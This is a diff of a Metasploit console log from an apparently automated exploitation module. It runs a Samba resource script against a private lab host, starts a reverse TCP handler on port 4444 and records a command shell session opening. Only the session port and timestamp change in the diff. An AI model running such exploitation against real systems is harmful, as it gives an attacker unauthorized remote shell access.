@@ -10,6 +10,6 @@ resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_samba.rc)> set
 ExitOnSession => true
 resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_samba.rc)> run
 [0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.102:4444 
-[1m[34m[*][0m Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.103:58052) at 2025-05-25 20:55:06 -0400
+[1m[34m[*][0m Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.103:44615) at 2025-05-26 12:48:14 -0400
 
 [0m
